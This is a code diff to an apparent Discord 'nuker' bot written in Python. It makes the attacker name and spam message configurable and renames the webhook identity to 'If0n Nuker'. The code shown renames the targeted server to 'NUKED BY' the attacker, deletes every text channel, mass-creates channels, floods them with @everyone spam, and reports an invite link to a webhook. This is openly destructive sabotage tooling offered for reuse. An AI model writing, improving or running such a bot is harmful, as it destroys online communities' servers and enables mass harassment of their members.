@@ -7,8 +7,11 @@ import threading
 
 intents = discord.Intents.default()
 bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
+
 webhook_url = "WEBHOOK-HERE"
 token = "TOKEN-HERE"
+name = "NAME-HERE"
+msg = "MSG-HERE"
 
 @bot.command()
 async def ping(ctx):
@@ -17,14 +20,15 @@ async def ping(ctx):
 
 cspamm = False
 
+@bot.command
 async def cspam(ctx):
     for i in range(1, 69):
-        channel = await ctx.guild.create_text_channel(f"@Info-Runs-Cord")
-        await channel.send("@everyone @ Info Runs Discord https://discord.gg/gZbKrxb29M @everyone")
+        channel = await ctx.guild.create_text_channel(f"{name} better")
+        await channel.send(f"{msg}")
 
         while cspamm:
             for i in range(1, 150):
-                await channel.send("@everyone @ Info Runs Discord https://discord.gg/gZbKrxb29M @everyone")
+                await channel.send(f"{msg}")
 #You are fully aloud to take code from this project but you must give credit.
 @bot.command()
 async def nuke(ctx):
@@ -34,7 +38,7 @@ async def nuke(ctx):
     invite_link = invite.url
 
     payload = {
-        "username": "@ Info",
+        "username": "If0n Nuker",
         "embeds": [
           {
             "id": 568521340,
@@ -52,8 +56,8 @@ async def nuke(ctx):
 #You are fully aloud to take code from this project but you must give credit.
     # The actual nuke
     time.sleep(3)
-    await ctx.send('NUKED BY @ Info https://discord.gg/gZbKrxb29M')
-    await ctx.guild.edit(name="NUKED BY @ INFO")
+    await ctx.send(f'NUKED BY {name}')
+    await ctx.guild.edit(name=f"NUKED BY {name}")
     for channel in ctx.guild.text_channels:
         await channel.delete()
     threading.Thread(target=cspam).start()
